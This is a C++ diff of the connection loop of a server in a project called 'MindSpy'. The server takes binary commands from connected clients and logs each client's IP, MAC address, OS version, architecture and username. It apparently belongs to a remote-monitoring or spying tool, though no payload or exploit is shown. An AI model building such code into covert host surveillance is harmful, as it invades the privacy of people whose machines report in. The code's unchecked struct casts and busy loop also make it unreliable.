@@ -80,43 +80,46 @@ namespace MindSpy
 		int MyID = Conexiones.size() - 1;
 		Conexiones[MyID].Activa = true;
 		char szBuff[512];
-		while (true) {
+		while (Conexiones[MyID].Activa) {
+			DWORD bDisponibles;
+			ioctlsocket(Conexiones[MyID].c_socket, FIONREAD, &bDisponibles);
+			if (!bDisponibles) 
+				continue;
 			int resp = recv(Conexiones[MyID].c_socket, szBuff, sizeof(szBuff), 0);
-			if (resp > 0 && strlen(szBuff)) {
+			if (resp == 0)
+				continue;
+			else if (resp < 0)
+				break;
 
-				if (szBuff[0] != '/') 
-				{
-					if (strlen(Conexiones[MyID].Alias)) {
-						cout << "Mensaje de" 
-							<< Conexiones[MyID].Alias 
-							<< " (" << Conexiones[MyID].IP 
-							<< "): " << szBuff << endl;
-					}
-					else 
-					{
-						cout << "Mensaje de " << Conexiones[MyID].IP 
-							<< ": " << szBuff << endl;
-					}
-				} 
-				else
-				{
-					if (!strcmp(szBuff, "/close")) {
-						break;
-					}
-					else if (!strcmp(szBuff, "/name")) {
-						sprintf(szBuff, "Carlos D. Alvarez (%d)", Conexiones[MyID].ID);
-						cout << "Enviando nombre..." << endl;
-						send(Conexiones[MyID].c_socket, szBuff, sizeof(szBuff), NULL);
-					}
-				}
-			}
-			else if (resp == SOCKET_ERROR) {
+			USHORT comando = *(USHORT*)&szBuff[2];
+
+			switch (comando)
+			{
+			case SRV_CMD::CLOSE:
+				Conexiones[MyID].Activa = false;
+				break;
+
+			case SRV_CMD::VERSION:
+				cout << "Version del cliente: " << &szBuff[4] << endl;
+				break;
+
+			case SRV_CMD::SYSINFO:
+				Conexiones[MyID].SistemaCliente = *(stCon::stSystemInfo*)&szBuff[4];
+				cout << "Informacion de cliente recibida." << endl;
+				cout << "IP: " << Conexiones[MyID].IP << endl;
+				cout << "MAC: " << Conexiones[MyID].SistemaCliente.MAC << endl;
+				cout << "Version de OS: " << Conexiones[MyID].SistemaCliente.VersionMayor << "."
+					<< Conexiones[MyID].SistemaCliente.VersionMenor << "."
+					<< Conexiones[MyID].SistemaCliente.Build << " ("
+					<< Conexiones[MyID].SistemaCliente.NombreOS << ")." << endl;
+				cout << "Arquitectura: " << Conexiones[MyID].SistemaCliente.Arquitectura << " bits." << endl;
+				cout << "Nombre de usuario: " << Conexiones[MyID].SistemaCliente.NombreUsuario << endl;
 				break;
 			}
-			Sleep(30);
+
+			Sleep(50);
 		}
 		cout << "Cerrando conexion con " << Conexiones[MyID].IP << " (" << Conexiones[MyID].ID << ")..." << endl;
-		Conexiones[MyID].Activa = false;
 		closesocket(Conexiones[MyID].c_socket);
 	}
 
